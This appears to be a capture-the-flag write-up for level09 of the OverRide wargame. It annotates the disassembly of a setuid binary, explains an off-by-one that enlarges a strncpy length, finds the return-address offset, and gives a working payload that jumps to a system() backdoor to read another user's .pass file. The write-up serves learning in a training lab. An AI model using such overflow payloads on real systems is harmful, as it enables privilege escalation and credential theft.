# LEVEL09
**Info: level protect option**
```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```
```sh
level09@OverRide:~$ ls -la
total 25
dr-xr-x---+ 1 level09 level09    80 Oct  2  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
-rw-r--r--  1 level09 level09   220 Oct  2  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Oct  2  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level09 level09  3534 Oct  2  2016 .bashrc
-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09
-rw-r--r--+ 1 level09 level09    41 Oct 19  2016 .pass
-rw-r--r--  1 level09 level09   675 Oct  2  2016 .profile
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: 42
>: Welcome, 42
>: Msg @Unix-Dude
>>: 42
>: Msg sent!
```
We can find one excutable file **level09**, takes some standard input. \
After trying to analyze assembly code, you can find one logical mistake at ```set_username``` function
```sh
(gdb) disas set_username
   ...
   0x0000000000000a66 <+153>:   addl   $0x1,-0x4(%rbp) # int var + 1
   0x0000000000000a6a <+157>:   cmpl   $0x28,-0x4(%rbp) # int variable > 40
   0x0000000000000a6e <+161>:   jg     0xa81 <set_username+180> # len <= 40
   0x0000000000000a70 <+163>:   mov    -0x4(%rbp),%eax
```
The problem here is that our int variable is sized 40, but comparing it with 0x28 is wrong, as it can be written without '\0'. \
So if we write more than we can by 1 byte, at index 40, we can overwrite one integer variable that comes after this 40 sized int variable. \
That one integer variable is ```len```, which will be used later at ```strncpy``` function to write our input (buffer) in firstparameter->something. \
Firstparameter->something is sized 140, but as we overwrited one character (which is 2 byte) at index 40, we can overwrite that integer ```len``` variable with something like ```\xff```.
```sh
(gdb) disas handle_msg
   ...
   0x00000000000008cb <+11>:    lea    -0xc0(%rbp),%rax
   0x00000000000008d2 <+18>:    add    $0x8c,%rax # msg = 140
   0x00000000000008d8 <+24>:    movq   $0x0,(%rax) # buffer[0] = 0
   0x00000000000008df <+31>:    movq   $0x0,0x8(%rax) # buffer[1] = 0
   0x00000000000008e7 <+39>:    movq   $0x0,0x10(%rax) # buffer[2] = 0
   0x00000000000008ef <+47>:    movq   $0x0,0x18(%rax) # buffer[3] = 0
   0x00000000000008f7 <+55>:    movq   $0x0,0x20(%rax) # buffer[4] = 0
   0x00000000000008ff <+63>:    movl   $0x8c,-0xc(%rbp) # 0xc, some struct variable = 140
   ...
```
Now our ```len``` will be 255 in integer, so function ```strncpy``` will overwrite ```firstparameter->something(0)``` which has 140 size, by our input ```buffer[1024]``` by 255 byte.
```sh
(gdb) disas set_msg
   ...
   0x00000000000009a2 <+112>:   mov    -0x408(%rbp),%rax # first parameter
   0x00000000000009a9 <+119>:   mov    0xb4(%rax),%eax # firstparameter->something
   0x00000000000009af <+125>:   movslq %eax,%rdx
   0x00000000000009b2 <+128>:   lea    -0x400(%rbp),%rcx # buffer[1024]
   0x00000000000009b9 <+135>:   mov    -0x408(%rbp),%rax # first parameter
   0x00000000000009c0 <+142>:   mov    %rcx,%rsi
   0x00000000000009c3 <+145>:   mov    %rax,%rdi
   0x00000000000009c6 <+148>:   callq  0x720 <strncpy@plt> # strncpy(firstparameter->something(0), buffer, firstfarameter->something(b4))
   ...
```
We can overflow enough that ```firstparameter->something(0)``` to make program segfault (overwrite EIP). To find exact offset of EIP we run our old friend pattern generator
```sh
Starting program: /home/users/level09/level09 < <(python -c 'print "0" * 40 + "\xff" + "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag6ag7ag8ag9ah0ah1ah2ah3ah4ah5ah6ah7ah8ah9ai0ai1ai2ai3ai4ai5ai6ai7ai8ai9aj0aj1aj2aj3aj4aj5aj6aj7aj8aj9"')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, 0000000000000000000000000000000000000000�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) i r
rax            0xd      13
rbx            0x0      0
rcx            0x7ffff7b01f90   140737348902800
rdx            0x7ffff7dd5a90   140737351867024
rsi            0x7ffff7ff7000   140737354100736
rdi            0xffffffff       4294967295
rbp            0x61346a61336a6132       0x61346a61336a6132
...
# pattern_generator.py
Enter the hex value to find (e.g., 0x63613563): 0x61346a61336a6132
Little Endian ASCII representation: '2aj3aj4a'
'2aj3aj4a' found at offset: 278
```
The EIP is at 278. \
Now we can fill those values with random value but with additional offset 8, which is RSP. \
```sh
Starting program: /home/users/level09/level09 < <(python -c 'print "0" * 40 + "\xff" + "B" * 286 + "AAAA"')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, 0000000000000000000000000000000000000000�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000a41414141 in ?? ()
```
Finally we can put the address of ```secret_backdoor``` to overwrite RSP, so it will be called with our next input, which is argument for the ```system``` call.
```sh
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```
Fortunately even PIE was enabled, the ASLR option was disabled, so we could use always constant addresses. Or it would be cahnged on every program run.
```sh
level09@OverRide:~$ cat /proc/sys/kernel/randomize_va_space
0
```
Now simply put ```'\n'``` for the previous ```fgets``` then put command to run.
```sh
level09@OverRide:~$ (python -c 'print "0" * 40 + "\xff" + "B" * 286 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "cat /home/users/end/.pass"') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, 0000000000000000000000000000000000000000�>: Msg @Unix-Dude
>>: >: Msg sent!
(hidden)
Segmentation fault (core dumped)
```
level09 passed !

ps.
```sh
level09@OverRide:~$ su end
Password: (hidden)
end@OverRide:~$ ls -la
total 13
dr-xr-x---+ 1 end  end     80 Sep 13  2016 .
dr-x--x--x  1 root root   260 Oct  2  2016 ..
-rw-r--r--  1 end  end    220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root root     7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 end  end   3489 Sep 10  2016 .bashrc
-rwsr-s---+ 1 end  users    5 Sep 10  2016 end
-rw-r--r--+ 1 end  end     41 Oct 19  2016 .pass
-rw-r--r--  1 end  end    675 Sep 10  2016 .profile
end@OverRide:~$ cat end
GG !
```

assmebly analyze
---
```sh
(gdb) disas secret_backdoor
Dump of assembler code for function secret_backdoor:
   0x000000000000088c <+0>:     push   %rbp
   0x000000000000088d <+1>:     mov    %rsp,%rbp
   0x0000000000000890 <+4>:     add    $0xffffffffffffff80,%rsp
   0x0000000000000894 <+8>:     mov    0x20171d(%rip),%rax        # 0x201fb8
   0x000000000000089b <+15>:    mov    (%rax),%rax # stdin
   0x000000000000089e <+18>:    mov    %rax,%rdx
   0x00000000000008a1 <+21>:    lea    -0x80(%rbp),%rax # buffer[128]
   0x00000000000008a5 <+25>:    mov    $0x80,%esi # 128
   0x00000000000008aa <+30>:    mov    %rax,%rdi
   0x00000000000008ad <+33>:    callq  0x770 <fgets@plt> # fgets(buffer[128], 128, stdin)
   0x00000000000008b2 <+38>:    lea    -0x80(%rbp),%rax
   0x00000000000008b6 <+42>:    mov    %rax,%rdi
   0x00000000000008b9 <+45>:    callq  0x740 <system@plt> # system(buffer)
   0x00000000000008be <+50>:    leaveq 
   0x00000000000008bf <+51>:    retq   
End of assembler dump.
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:     push   %rbp
   0x00000000000008c1 <+1>:     mov    %rsp,%rbp
   0x00000000000008c4 <+4>:     sub    $0xc0,%rsp # 192
   0x00000000000008cb <+11>:    lea    -0xc0(%rbp),%rax
   0x00000000000008d2 <+18>:    add    $0x8c,%rax # msg = 140
   0x00000000000008d8 <+24>:    movq   $0x0,(%rax) # buffer[0] = 0
   0x00000000000008df <+31>:    movq   $0x0,0x8(%rax) # buffer[1] = 0
   0x00000000000008e7 <+39>:    movq   $0x0,0x10(%rax) # buffer[2] = 0
   0x00000000000008ef <+47>:    movq   $0x0,0x18(%rax) # buffer[3] = 0
   0x00000000000008f7 <+55>:    movq   $0x0,0x20(%rax) # buffer[4] = 0
   0x00000000000008ff <+63>:    movl   $0x8c,-0xc(%rbp) # 0xc, some struct variable = 140
   0x0000000000000906 <+70>:    lea    -0xc0(%rbp),%rax
   0x000000000000090d <+77>:    mov    %rax,%rdi
   0x0000000000000910 <+80>:    callq  0x9cd <set_username> # set_username(struct)
   0x0000000000000915 <+85>:    lea    -0xc0(%rbp),%rax
   0x000000000000091c <+92>:    mov    %rax,%rdi
   0x000000000000091f <+95>:    callq  0x932 <set_msg> # set_msg(struct)
   0x0000000000000924 <+100>:   lea    0x295(%rip),%rdi        # 0xbc0
   0x000000000000092b <+107>:   callq  0x730 <puts@plt>
   0x0000000000000930 <+112>:   leaveq 
   0x0000000000000931 <+113>:   retq   
End of assembler dump.
(gdb) disas set_msg
Dump of assembler code for function set_msg:
   0x0000000000000932 <+0>:     push   %rbp
   0x0000000000000933 <+1>:     mov    %rsp,%rbp
   0x0000000000000936 <+4>:     sub    $0x410,%rsp # 1040
   0x000000000000093d <+11>:    mov    %rdi,-0x408(%rbp) # first parameter
   0x0000000000000944 <+18>:    lea    -0x400(%rbp),%rax # buffer[1024]
   0x000000000000094b <+25>:    mov    %rax,%rsi
   0x000000000000094e <+28>:    mov    $0x0,%eax
   0x0000000000000953 <+33>:    mov    $0x80,%edx # 128 * 8 = 1024
   0x0000000000000958 <+38>:    mov    %rsi,%rdi # buffer[1024]
   0x000000000000095b <+41>:    mov    %rdx,%rcx
   0x000000000000095e <+44>:    rep stos %rax,%es:(%rdi) # memset(buffer[1024], 0, 1024)
   0x0000000000000961 <+47>:    lea    0x265(%rip),%rdi        # 0xbcd
   0x0000000000000968 <+54>:    callq  0x730 <puts@plt> # ">: Msg @Unix-Dude"
   0x000000000000096d <+59>:    lea    0x26b(%rip),%rax        # 0xbdf
   0x0000000000000974 <+66>:    mov    %rax,%rdi
   0x0000000000000977 <+69>:    mov    $0x0,%eax
   0x000000000000097c <+74>:    callq  0x750 <printf@plt> # printf()">>: ")
   0x0000000000000981 <+79>:    mov    0x201630(%rip),%rax        # 0x201fb8
   0x0000000000000988 <+86>:    mov    (%rax),%rax # stdin
   0x000000000000098b <+89>:    mov    %rax,%rdx
   0x000000000000098e <+92>:    lea    -0x400(%rbp),%rax
   0x0000000000000995 <+99>:    mov    $0x400,%esi
   0x000000000000099a <+104>:   mov    %rax,%rdi
   0x000000000000099d <+107>:   callq  0x770 <fgets@plt> # fgets(buffer[1024], 1024, stdin)
   0x00000000000009a2 <+112>:   mov    -0x408(%rbp),%rax # first parameter
   0x00000000000009a9 <+119>:   mov    0xb4(%rax),%eax # firstparameter->something
   0x00000000000009af <+125>:   movslq %eax,%rdx
   0x00000000000009b2 <+128>:   lea    -0x400(%rbp),%rcx # buffer[1024]
   0x00000000000009b9 <+135>:   mov    -0x408(%rbp),%rax # first parameter
   0x00000000000009c0 <+142>:   mov    %rcx,%rsi
   0x00000000000009c3 <+145>:   mov    %rax,%rdi
   0x00000000000009c6 <+148>:   callq  0x720 <strncpy@plt> # strncpy(firstparameter->something(0), buffer, firstfarameter->something(b4))
   0x00000000000009cb <+153>:   leaveq 
   0x00000000000009cc <+154>:   retq   
End of assembler dump.
(gdb) disas set_username
Dump of assembler code for function set_username:
   0x00000000000009cd <+0>:     push   %rbp
   0x00000000000009ce <+1>:     mov    %rsp,%rbp
   0x00000000000009d1 <+4>:     sub    $0xa0,%rsp # 176
   0x00000000000009d8 <+11>:    mov    %rdi,-0x98(%rbp) # var = first parameter
   0x00000000000009df <+18>:    lea    -0x90(%rbp),%rax # some variable[]
   0x00000000000009e6 <+25>:    mov    %rax,%rsi
   0x00000000000009e9 <+28>:    mov    $0x0,%eax # 0 
   0x00000000000009ee <+33>:    mov    $0x10,%edx # 16 * 8
   0x00000000000009f3 <+38>:    mov    %rsi,%rdi
   0x00000000000009f6 <+41>:    mov    %rdx,%rcx
   0x00000000000009f9 <+44>:    rep stos %rax,%es:(%rdi) # memset(variable[128], 0, 128)
   0x00000000000009fc <+47>:    lea    0x1e1(%rip),%rdi        # 0xbe4
   0x0000000000000a03 <+54>:    callq  0x730 <puts@plt> # ">: Enter your username"
   0x0000000000000a08 <+59>:    lea    0x1d0(%rip),%rax        # 0xbdf
   0x0000000000000a0f <+66>:    mov    %rax,%rdi
   0x0000000000000a12 <+69>:    mov    $0x0,%eax
   0x0000000000000a17 <+74>:    callq  0x750 <printf@plt> # printf(">>: ")
   0x0000000000000a1c <+79>:    mov    0x201595(%rip),%rax        # 0x201fb8
   0x0000000000000a23 <+86>:    mov    (%rax),%rax
   0x0000000000000a26 <+89>:    mov    %rax,%rdx
   0x0000000000000a29 <+92>:    lea    -0x90(%rbp),%rax # var
   0x0000000000000a30 <+99>:    mov    $0x80,%esi
   0x0000000000000a35 <+104>:   mov    %rax,%rdi
   0x0000000000000a38 <+107>:   callq  0x770 <fgets@plt> # fgets(variable[128], 128, stdin)
   0x0000000000000a3d <+112>:   movl   $0x0,-0x4(%rbp) # variable = 0
   0x0000000000000a44 <+119>:   jmp    0xa6a <set_username+157>
   0x0000000000000a46 <+121>:   mov    -0x4(%rbp),%eax # loop start
   0x0000000000000a49 <+124>:   cltq   
   0x0000000000000a4b <+126>:   movzbl -0x90(%rbp,%rax,1),%ecx # var
   0x0000000000000a53 <+134>:   mov    -0x98(%rbp),%rdx # first parameter
   0x0000000000000a5a <+141>:   mov    -0x4(%rbp),%eax
   0x0000000000000a5d <+144>:   cltq   
   0x0000000000000a5f <+146>:   mov    %cl,0x8c(%rdx,%rax,1)
   0x0000000000000a66 <+153>:   addl   $0x1,-0x4(%rbp) # int var + 1
   0x0000000000000a6a <+157>:   cmpl   $0x28,-0x4(%rbp) # int variable > 40
   0x0000000000000a6e <+161>:   jg     0xa81 <set_username+180> # len <= 40
   0x0000000000000a70 <+163>:   mov    -0x4(%rbp),%eax
   0x0000000000000a73 <+166>:   cltq   
   0x0000000000000a75 <+168>:   movzbl -0x90(%rbp,%rax,1),%eax # var name[len]
   0x0000000000000a7d <+176>:   test   %al,%al # != 0
   0x0000000000000a7f <+178>:   jne    0xa46 <set_username+121> # loop
   0x0000000000000a81 <+180>:   mov    -0x98(%rbp),%rax # first parameter
   0x0000000000000a88 <+187>:   lea    0x8c(%rax),%rdx # var firstparameter->something
   0x0000000000000a8f <+194>:   lea    0x165(%rip),%rax        # 0xbfb
   0x0000000000000a96 <+201>:   mov    %rdx,%rsi
   0x0000000000000a99 <+204>:   mov    %rax,%rdi
   0x0000000000000a9c <+207>:   mov    $0x0,%eax # return 0
   0x0000000000000aa1 <+212>:   callq  0x750 <printf@plt> # printf(">: Welcome, %s", firstparameter->something)
   0x0000000000000aa6 <+217>:   leaveq 
   0x0000000000000aa7 <+218>:   retq   
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000000aa8 <+0>:     push   %rbp
   0x0000000000000aa9 <+1>:     mov    %rsp,%rbp
   0x0000000000000aac <+4>:     lea    0x15d(%rip),%rdi        # 0xc10
   0x0000000000000ab3 <+11>:    callq  0x730 <puts@plt> # '-' <repeats 44 times>, "\n|   ~Welcome to l33t-m$n ~    v1337        |\n", '-' <repeats 44 times>
   0x0000000000000ab8 <+16>:    callq  0x8c0 <handle_msg>
   0x0000000000000abd <+21>:    mov    $0x0,%eax # return 0
   0x0000000000000ac2 <+26>:    pop    %rbp
   0x0000000000000ac3 <+27>:    retq   
End of assembler dump.
```